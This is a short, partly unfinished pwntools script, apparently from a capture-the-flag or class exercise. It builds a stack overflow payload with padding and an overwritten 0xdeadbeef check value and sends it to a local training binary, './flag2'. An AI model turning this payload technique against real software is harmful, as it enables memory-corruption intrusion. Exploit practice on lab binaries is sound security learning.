import sys
import time
import struct

from pwn import *

context.update(arch='x86_64', os='linux')

#you will fill in this line once you are ready to complete the exploit
COMPARE_VALUE = 0xdeadbeef
CALL_ME_FUNC_ADDR = 0x5655557d
EBP_ADDRESS = 0xffffd0c8

#this line shows you what 64 bytes of cyclic will look like

#uncomment this line and fill in a large enough amount of data that will cause a segmentation fault
### you can determine this from the flag.c source code, or just by random guess, break it however you want

#padding
payload = cyclic(0xA)
#protector
payload += struct.pack("I", COMPARE_VALUE)
#padding
payload += cyclic(0x4)
#some_other_value
payload += struct.pack("I", 0x0)

payload += struct.pack("I", COMPARE_VALUE)

print(payload)

#payload = cyclic(cyclic_find())
#payload += p64(BINARY_ADDRESS)

if (len(sys.argv)<= 1):
    p = process("./flag2")
elif (sys.argv[1] == "dbg"):
    p = gdb.debug(["./flag2"],'''
    unset env LINES
    unset env COLUMNS
    break main
    ''')

p.sendline(payload)
p.interactive()

